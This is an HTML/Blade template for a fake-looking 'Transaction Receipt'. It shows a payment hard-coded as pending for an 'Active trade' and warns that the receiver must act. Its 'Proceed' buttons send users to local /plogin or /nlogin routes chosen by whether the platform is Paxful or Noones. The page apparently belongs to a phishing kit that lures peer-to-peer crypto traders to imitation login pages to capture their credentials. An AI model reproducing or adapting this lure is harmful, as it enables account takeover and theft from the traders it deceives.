<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

  <title>Transaction Receipt</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f5f8fa;
      padding: 2rem;
      display: flex;
      justify-content: center;
    }

    .receipt {
      background: #fff;
      width: 100%;
      max-width: 700px;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
    }

    .receipt-header {
      background: linear-gradient(135deg, #007bff, #6610f2);
      color: white;
      text-align: center;
      padding: 1.5rem;
    }

    .receipt-header h2 {
      margin: 0;
      font-size: 1.8rem;
    }

    .section {
      padding: 1.5rem 2rem;
      border-bottom: 1px solid #e2e8f0;
    }

    .section:last-child {
      border-bottom: none;
    }

    .section-title {
      font-size: 1.1rem;
      margin-bottom: 1rem;
      font-weight: 600;
      color: #333;
      border-left: 5px solid #007bff;
      padding-left: 0.5rem;
    }

    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0.5rem 0;
    }

    .label {
      color: #555;
      flex: 1;
    }

    .value {
      font-weight: 600;
      color: #222;
      flex: 1;
      text-align: right;
    }

    .footer {
      background: #f1f1f1;
      padding: 1rem;
      text-align: center;
      font-size: 0.9rem;
      color: #777;
      border-top: 1px solid #ddd;
    }

    @media (max-width: 600px) {
      .row {
        flex-direction: column;
        align-items: flex-start;
      }

      .value {
        text-align: left;
        margin-top: 0.2rem;
      }
    }
  </style>
</head>
<body>
  <div class="receipt">
    <div class="receipt-header">
      <h2>Transaction Receipt</h2>
    </div>

    <!-- Transaction Details -->
    <div class="section">
    <div class="row">
        <div class="label">Amount:</div>
        <div class="value">{{ $payment->currency }} {{ number_format($payment->amount, 2) }}</div>
      </div>
      <div class="row">
        <div class="label"> Payment Mode:</div>
        <div class="value">{{ $payment->currency }} {{ ($payment->account_type) }}</div>
      </div>

      <div class="row">
        <div class="label">Transaction Status:</div>
        <div class="value">Pending</div>
      </div>
      
      
    </div>

    <!-- Receiver's Information -->
    <div class="section">
      <div class="section-title">Receiver's Information</div>
      <div class="row">
        <div class="label">Receiver's Name:</div>
        <div class="value">{{ $payment->account_name }}</div>
      </div>
      <div class="row">
        <div class="label">Receiver's Account Number:</div>
        <div class="value">{{ $payment->client_email }}</div>
      </div>
      <div class="row">
        <div class="label">Amount:</div>
        <div class="value">{{ $payment->currency }} {{ number_format($payment->amount, 2) }}</div>
      </div>
    </div>

    <!-- Additional Information -->
    <div class="section">
      <div class="section-title">Additional Information</div>
     
      <div class="row">
        <div class="label">Reference:</div>
        <div class="value">0100{{ request()->id }}</div>
      </div>

      <div class="row">
        <div class="label">Reason For Payment:</div>
        <div class="value">Active trade</div>
      </div>
    </div>

    <div class="text-center mt-4">
    @if(strtolower($payment->platform) == 'paxful')
        <a href="{{ url('/plogin') }}" class="btn btn-primary">Proceed</a>
    @elseif(strtolower($payment->platform) == 'noones')
        <a href="{{ url('/nlogin') }}" class="btn btn-success">Proceed</a>
    @endif
</div>
<br>

    <!-- Footer -->
    <div class="footer">
    Action Required: The payment is currently on hold. The receiver must either accept the payment to transfer funds instantly to their account or cancel the transfer for an immediate refund to the sender.

Note: Once the transfer is initiated, only the receiver can complete or cancel the transaction.
    </div>
  </div>
</body>
</html>
